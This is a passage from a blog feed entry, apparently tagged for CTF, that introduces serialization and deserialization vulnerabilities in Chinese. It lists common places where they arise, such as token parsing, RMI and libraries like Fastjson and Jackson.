    <summary type="html">&lt;h1 id=&quot;漏洞详解&quot;&gt;&lt;a href=&quot;#漏洞详解&quot; class=&quot;headerlink&quot; title=&quot;漏洞详解&quot;&gt;&lt;/a&gt;漏洞详解&lt;/h1&gt;&lt;p&gt;反序列化：把字节序列恢复为对象的过程，即把可以存储或传输的数据转换为对象的过程。例如将二进制数据流或文件加载到内存中还原为对象。&lt;br&gt;序列化：把对象转换为字节序列的过程，即把对象转换为可以存储或传输的数据的过程。例如将内存中的对象转换为二进制数据流或文件，在网络传输过程中，可以是字节或是XML等格式。&lt;br&gt;简单来说,序列化就像是把数据加密,像json一样的格式,反序列化就是解密成原来的样子&lt;/p&gt;
&lt;h1 id=&quot;漏洞可能出现的位置&quot;&gt;&lt;a href=&quot;#漏洞可能出现的位置&quot; class=&quot;headerlink&quot; title=&quot;漏洞可能出现的位置&quot;&gt;&lt;/a&gt;漏洞可能出现的位置&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;解析认证token、session的位置&lt;/li&gt;
&lt;li&gt;将序列化的对象存储到磁盘文件或存入数据库后反序列化时的位置，如读取json文件，xml文件等&lt;/li&gt;
&lt;li&gt;将对象序列化后在网络中传输，如传输json数据，xml数据等&lt;/li&gt;
&lt;li&gt;参数传递给程序&lt;/li&gt;
&lt;li&gt;使用RMI协议，被广泛使用的RMI协议完全基于序列化&lt;/li&gt;
&lt;li&gt;使用了不安全的框架或基础类库，如JMX 、Fastjson和Jackson等&lt;/li&gt;
&lt;li&gt;定义协议用来接收与发送原始的java对象&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&quot;PHP反序列化&quot;&gt;&lt;a href=&quot;#PHP反序列化&quot; class=&quot;headerlink&quot; title=&quot;PHP反序列化&quot;&gt;&lt;/a&gt;PHP反序列化&lt;/h1&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://syst1m.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://syst1m.top/tags/CTF/"/>
    
    <category term="反序列化" scheme="https://syst1m.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
</feed>
